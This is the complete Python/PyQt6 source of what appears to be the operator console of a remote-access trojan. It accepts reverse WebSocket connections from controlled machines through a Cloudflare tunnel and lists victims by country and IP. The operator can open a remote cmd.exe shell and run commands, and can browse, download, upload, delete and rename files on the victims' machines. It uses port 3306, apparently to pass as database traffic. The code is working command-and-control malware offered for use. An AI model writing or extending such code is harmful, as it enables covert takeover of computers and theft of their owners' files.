import sys
import os
import socket
import threading
import hashlib
import base64
import time
import struct
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                             QInputDialog, QFileDialog)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
from PyQt6.QtGui import QColor, QPalette

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A

FILE_CHUNK = 65536


def ws_compute_accept(key: bytes) -> bytes:
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)


def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))


def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    header = bytearray()
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)
    length = len(payload)
    if length <= 125:
        header.append(length)
    elif length <= 0xFFFF:
        header.append(126)
        header.extend(struct.pack(">H", length))
    else:
        header.append(127)
        header.extend(struct.pack(">Q", length))
    return bytes(header) + payload


def ws_parse_frame(data: bytearray):
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]; p += 1
    b2 = data[p]; p += 1
    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F
    if payload_len == 126:
        if len(data) < p + 2: return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]; p += 2
    elif payload_len == 127:
        if len(data) < p + 8: return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]; p += 8
    mask_key = b""
    if has_mask:
        if len(data) < p + 4: return (None, None, None, 0)
        mask_key = data[p:p+4]; p += 4
    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)
    raw_payload = data[p:p+payload_len]
    payload = ws_unmask_payload(raw_payload, mask_key) if has_mask else raw_payload
    return (fin, opcode, payload, total_need)


def ws_handle_http_upgrade(sock: socket.socket):
    buf = bytearray()
    start = time.time()
    try:
        while True:
            if time.time() - start > 8:
                return False, "", "", ""
            chunk = sock.recv(1024)
            if not chunk:
                time.sleep(0.01); continue
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception:
        return False, "", "", ""

    first_line = buf.split(b"\r\n")[0]
    parts = first_line.split(b" ")
    if len(parts) < 3:
        return False, "", "", ""
    method, path, proto = parts
    if path not in (b"/", b"/ws"):
        return False, "", "", ""

    headers = {}
    for line in buf.split(b"\r\n")[1:]:
        if not line: continue
        if b":" in line:
            k_raw, v_raw = line.split(b":", 1)
            headers[bytes(k_raw).strip().lower()] = bytes(v_raw).strip()

    real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()
    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip() or "XX"
    display_name = f"[{country}] {real_ip}" if real_ip else f"[{country}] 未知IP"

    conn_val = headers.get(b"connection", b"")
    upgrade_val = headers.get(b"upgrade", b"")
    ws_key = headers.get(b"sec-websocket-key")
    ws_version = headers.get(b"sec-websocket-version")

    if conn_val != b"Upgrade": return False, real_ip, country, display_name
    if upgrade_val != b"websocket": return False, real_ip, country, display_name
    if not ws_key: return False, real_ip, country, display_name
    if ws_version != b"13": return False, real_ip, country, display_name

    accept_val = ws_compute_accept(ws_key)
    resp = (b"HTTP/1.1 101 Switching Protocols\r\n"
            b"Upgrade: websocket\r\n"
            b"Connection: Upgrade\r\n"
            b"Sec-WebSocket-Accept: " + accept_val + b"\r\n\r\n")
    try:
        sock.sendall(resp)
    except Exception:
        return False, real_ip, country, display_name
    return True, real_ip, country, display_name


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)
    on_fs = pyqtSignal(object, bytes)


class ClientSession:
    def __init__(self, conn, ip, country, display_name):
        self.conn = conn
        self.ip = ip
        self.country = country
        self.display_name = display_name
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        self._frag_buf = bytearray()
        self._frag_opcode = 0

    def send_packet(self, body: bytes) -> bool:
        if not self.connected:
            return False
        try:
            full_body = struct.pack(">I", len(body)) + body
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            return True
        except (OSError, BrokenPipeError):
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        self.connected = False
        try:
            self.conn.sendall(ws_build_server_frame(True, WS_OP_CLOSE, b""))
        except Exception:
            pass
        try: self.conn.shutdown(socket.SHUT_RDWR)
        except Exception: pass
        try: self.conn.close()
        except Exception: pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.display_name}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        info_bar = QHBoxLayout()
        info_bar.addWidget(QLabel(f"🌍 国家: {client_session.country}"))
        info_bar.addWidget(QLabel(f"📡 IP: {client_session.ip}"))
        info_bar.addStretch()
        lay.addLayout(info_bar)

        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode)

    def apply_theme(self, dark: bool):
        if dark:
            self.setStyleSheet("""
                QDialog { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
            """)
        else:
            self.setStyleSheet("")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class FileManagerDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.client = client_session
        self.setWindowTitle(f"远程文件管理 - {client_session.display_name}")
        self.resize(900, 600)

        self.current_path = ""
        self.download_buf = bytearray()
        self.download_total = 0
        self.download_name = ""
        self.upload_file = None
        self.upload_total = 0
        self.upload_sent = 0
        self.upload_path = ""
        self.fs_events = []

        lay = QVBoxLayout(self)
        path_lay = QHBoxLayout()
        self.path_edit = QLineEdit()
        self.path_edit.setPlaceholderText("输入路径，如 C:\\ 或 C:\\Users")
        self.path_edit.returnPressed.connect(self.on_go)
        path_lay.addWidget(self.path_edit)
        btn_go = QPushButton("转到"); btn_go.clicked.connect(self.on_go); path_lay.addWidget(btn_go)
        btn_up = QPushButton("上级"); btn_up.clicked.connect(self.on_up); path_lay.addWidget(btn_up)
        btn_refresh = QPushButton("刷新"); btn_refresh.clicked.connect(self.on_refresh); path_lay.addWidget(btn_refresh)
        lay.addLayout(path_lay)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["名称", "大小", "类型", "完整路径"])
        self.tree.setColumnWidth(0, 260)
        self.tree.setColumnWidth(1, 100)
        self.tree.setColumnWidth(2, 60)
        self.tree.itemDoubleClicked.connect(self.on_double_click)
        self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.tree)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setMaximumHeight(120)
        lay.addWidget(self.log_box)

        client_session.signals.on_fs.connect(self.on_fs_data)

        self.timer = QTimer(self)
        self.timer.setInterval(50)
        self.timer.timeout.connect(self.process_fs_events)
        self.timer.start()

        self.client.send_packet(b"FDRV")
        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode)

    def apply_theme(self, dark: bool):
        if dark:
            self.setStyleSheet("""
                QDialog { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QTreeWidget { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QPushButton { background-color: #3d3d3d; color: #d4d4d4; border: 1px solid #4d4d4d; padding: 4px 10px; }
            """)
        else:
            self.setStyleSheet("")

    def log(self, msg):
        self.log_box.append(msg)

    @pyqtSlot(object, bytes)
    def on_fs_data(self, sess, body: bytes):
        self.fs_events.append(bytes(body))

    def process_fs_events(self):
        while self.fs_events:
            body = self.fs_events.pop(0)
            self.handle_fs_packet(body)

    def handle_fs_packet(self, body: bytes):
        if len(body) < 4: return
        cmd = body[0:4]
        payload = body[4:]

        if cmd == b"FDRV":
            text = payload.decode("gbk", errors="replace")
            drives = [d for d in text.split("|") if d]
            self.tree.clear()
            for d in drives:
                item = QTreeWidgetItem([d, "", "驱动器", d])
                self.tree.addTopLevelItem(item)

        elif cmd == b"FDIR":
            text = payload.decode("gbk", errors="replace")
            self.tree.clear()
            for entry in text.split(";"):
                if not entry: continue
                parts = entry.split("|")
                if len(parts) < 4: continue
                name, full, size, typ = parts[0], parts[1], parts[2], parts[3]
                try:
                    sz = int(size)
                    size_str = self.format_size(sz) if typ == "F" else ""
                except ValueError:
                    size_str = ""
                type_str = "目录" if typ == "D" else "文件"
                item = QTreeWidgetItem([name, size_str, type_str, full])
                self.tree.addTopLevelItem(item)

        elif cmd == b"FMET":
            text = payload.decode("gbk", errors="replace")
            parts = text.split("|", 1)
            if len(parts) == 2:
                self.download_name = parts[0]
                self.download_total = int(parts[1])
                self.download_buf = bytearray()
                self.log(f"[下载] {self.download_name} ({self.download_total} 字节)")

        elif cmd == b"FDAT":
            if len(payload) < 8: return
            offset = struct.unpack("<Q", payload[0:8])[0]
            data = payload[8:]
            if offset == len(self.download_buf):
                self.download_buf.extend(data)
            else:
                self.log(f"[下载] 偏移异常 {offset} != {len(self.download_buf)}")
            if self.download_total > 0 and len(self.download_buf) >= self.download_total:
                self.finish_download()

        elif cmd == b"FACK":
            if len(payload) >= 8:
                offset = struct.unpack("<Q", payload[0:8])[0]
                self.upload_sent = offset
                if self.upload_file and self.upload_sent < self.upload_total:
                    self.send_next_upload_chunk()

        elif cmd == b"FOK":
            self.log("[OK]")

        elif cmd == b"FERR":
            self.log(f"[错误] {payload.decode('gbk', errors='replace')}")

    def finish_download(self):
        save_path, _ = QFileDialog.getSaveFileName(self, "保存文件", self.download_name)
        if save_path:
            with open(save_path, "wb") as f:
                f.write(self.download_buf)
            self.log(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
        else:
            self.log("[下载取消]")
        self.download_buf = bytearray()
        self.download_total = 0
        self.download_name = ""

    @staticmethod
    def format_size(n):
        for unit in ["B", "KB", "MB", "GB", "TB"]:
            if n < 1024: return f"{n:.1f} {unit}"
            n /= 1024
        return f"{n:.1f} PB"

    def on_go(self):
        path = self.path_edit.text().strip()
        if path:
            self.current_path = path
            self.client.send_packet(b"FDIR" + path.encode("gbk", errors="replace"))

    def on_up(self):
        if not self.current_path: return
        p = self.current_path.rstrip("\\")
        idx = p.rfind("\\")
        if idx <= 1:
            self.client.send_packet(b"FDRV")
            self.current_path = ""
        else:
            self.current_path = p[:idx]
            self.path_edit.setText(self.current_path)
            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))

    def on_refresh(self):
        if self.current_path:
            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
        else:
            self.client.send_packet(b"FDRV")

    def on_double_click(self, item, col):
        typ = item.text(2)
        full = item.text(3)
        if typ in ("目录", "驱动器"):
            self.current_path = full
            self.path_edit.setText(full)
            self.client.send_packet(b"FDIR" + full.encode("gbk", errors="replace"))
        elif typ == "文件":
            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))

    def on_context_menu(self, pos):
        item = self.tree.itemAt(pos)
        if not item: return
        typ = item.text(2)
        full = item.text(3)
        menu = QMenu()
        act_download = menu.addAction("下载") if typ == "文件" else None
        act_upload = menu.addAction("上传到此目录") if typ in ("目录", "驱动器") else None
        act_delete = menu.addAction("删除")
        act_rename = menu.addAction("重命名")
        act_mkdir = menu.addAction("新建文件夹") if typ in ("目录", "驱动器") else None
        ret = menu.exec(self.tree.viewport().mapToGlobal(pos))
        if act_download and ret == act_download:
            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
        elif act_upload and ret == act_upload:
            self.start_upload_to(full)
        elif ret == act_delete:
            self.client.send_packet(b"FDEL" + full.encode("gbk", errors="replace"))
            QTimer.singleShot(500, self.on_refresh)
        elif ret == act_rename:
            new_name, ok = QInputDialog.getText(self, "重命名", "新名称:", text=item.text(0))
            if ok and new_name:
                parent = full.rsplit("\\", 1)[0]
                new_full = parent + "\\" + new_name
                payload = f"{full}|{new_full}"
                self.client.send_packet(b"FREN" + payload.encode("gbk", errors="replace"))
                QTimer.singleShot(500, self.on_refresh)
        elif act_mkdir and ret == act_mkdir:
            name, ok = QInputDialog.getText(self, "新建文件夹", "名称:")
            if ok and name:
                new_dir = full.rstrip("\\") + "\\" + name
                self.client.send_packet(b"FMKD" + new_dir.encode("gbk", errors="replace"))
                QTimer.singleShot(500, self.on_refresh)

    def start_upload_to(self, remote_dir):
        local_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的文件")
        if not local_path: return
        fname = os.path.basename(local_path)
        remote_path = remote_dir.rstrip("\\") + "\\" + fname
        try:
            self.upload_file = open(local_path, "rb")
        except OSError as e:
            self.log(f"[上传失败] {e}"); return
        self.upload_total = os.path.getsize(local_path)
        self.upload_sent = 0
        self.upload_path = remote_path
        args = f"{remote_path}|{self.upload_total}"
        self.client.send_packet(b"FPUT" + args.encode("gbk", errors="replace"))
        self.log(f"[上传] {fname} ({self.upload_total} 字节) -> {remote_path}")

    def send_next_upload_chunk(self):
        if not self.upload_file: return
        chunk = self.upload_file.read(FILE_CHUNK)
        if not chunk:
            self.upload_file.close()
            self.upload_file = None
            self.log("[上传完成]")
            QTimer.singleShot(500, self.on_refresh)
            return
        offset = self.upload_sent
        body = b"FDAT" + struct.pack("<Q", offset) + chunk
        self.client.send_packet(body)

    def closeEvent(self, event):
        self.timer.stop()
        if self.upload_file:
            self.upload_file.close()
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.display_name} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        self.is_dark_mode = False
        self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
        self.resize(720, 520)
        self.server_sock = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs = {}
        self.open_file_dialogs = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听"); self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听"); self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False); top_lay.addWidget(self.btn_stop)
        top_lay.addStretch()
        self.btn_theme = QPushButton("🌙 夜间模式"); self.btn_theme.clicked.connect(self.toggle_theme)
        top_lay.addWidget(self.btn_theme)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        self.ping_timer = QTimer(self)
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)

        self.apply_theme(False)

    def apply_theme(self, dark: bool):
        self.is_dark_mode = dark
        if dark:
            self.setStyleSheet("""
                QMainWindow { background-color: #1e1e1e; }
                QWidget { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; padding: 4px; }
                QPushButton { background-color: #3d3d3d; color: #d4d4d4; border: 1px solid #4d4d4d; padding: 5px 15px; }
                QPushButton:hover { background-color: #4d4d4d; }
                QPushButton:disabled { color: #666; background-color: #2d2d2d; }
                QListView { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QListView::item:selected { background-color: #3d7a9e; }
                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QMenu { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QMenu::item:selected { background-color: #3d7a9e; }
                QTreeWidget { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
            """)
            self.btn_theme.setText("☀️ 日间模式")
        else:
            self.setStyleSheet("")
            self.btn_theme.setText("🌙 夜间模式")
        for dlg in self.open_cmd_dialogs.values():
            dlg.apply_theme(dark)
        for dlg in self.open_file_dialogs.values():
            dlg.apply_theme(dark)

    def toggle_theme(self):
        self.apply_theme(not self.is_dark_mode)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @pyqtSlot()
    def broadcast_ping(self):
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")

    def accept_loop(self):
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                ok, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                if not ok:
                    self.log(f"WebSocket握手失败 {addr}")
                    raw_conn.close(); continue
                if not ip: ip = addr[0]
                if not country: country = "XX"
                if not display_name: display_name = f"[{country}] {ip}"
                sess = ClientSession(raw_conn, ip, country, display_name)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"[新接入] {display_name}")
                threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess, text):
        if sess in self.open_cmd_dialogs:
            self.open_cmd_dialogs[sess].append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WebSocket连接已经断开")
        if sess in self.open_file_dialogs:
            dlg = self.open_file_dialogs.pop(sess)
            dlg.close()
        self.client_model.remove_by_obj(sess)
        self.log(f"[断开] {sess.display_name}")

    def client_recv_loop(self, sess):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk: break
                buf.extend(chunk)
                while True:
                    fin, opcode, payload, consumed = ws_parse_frame(buf)
                    if consumed <= 0: break
                    del buf[:consumed]

                    if opcode == WS_OP_PING:
                        pong = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong)
                        continue
                    elif opcode == WS_OP_PONG:
                        continue
                    elif opcode == WS_OP_CLOSE:
                        break
                    elif opcode == WS_OP_TEXT:
                        continue
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            if len(full_body) >= 4:
                                body_len = struct.unpack(">I", full_body[0:4])[0]
                                if len(full_body) >= 4 + body_len:
                                    body = full_body[4:4+body_len]
                                    if len(body) >= 4:
                                        cmd_code = body[0:4]
                                        if cmd_code == b"PONG":
                                            sess.last_pong = datetime.now()
                                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                        elif cmd_code == b"OUTP":
                                            out_text = body[4:].decode("gbk", errors="replace")
                                            sess.signals.on_outp.emit(sess, out_text)
                                        elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
                                                          b"FACK", b"FOK", b"FERR"):
                                            sess.signals.on_fs.emit(sess, body)
            except (OSError, ConnectionResetError):
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("127.0.0.1", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.ping_timer.start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_server(self):
        self.ping_timer.stop()
        self.server_running = False
        if self.server_sock:
            try: self.server_sock.close()
            except Exception: pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.open_file_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("服务器已停止")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid(): return
        sess = self.client_model.items[idx.row()]
        menu = QMenu()
        act_cmd = menu.addAction("打开远程CMD会话")
        act_file = menu.addAction("打开文件管理")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_(); dlg.activateWindow(); return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()
        elif ret == act_file:
            if sess in self.open_file_dialogs:
                dlg = self.open_file_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_(); dlg.activateWindow(); return
                else:
                    del self.open_file_dialogs[sess]
            dlg = FileManagerDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode)
            self.open_file_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
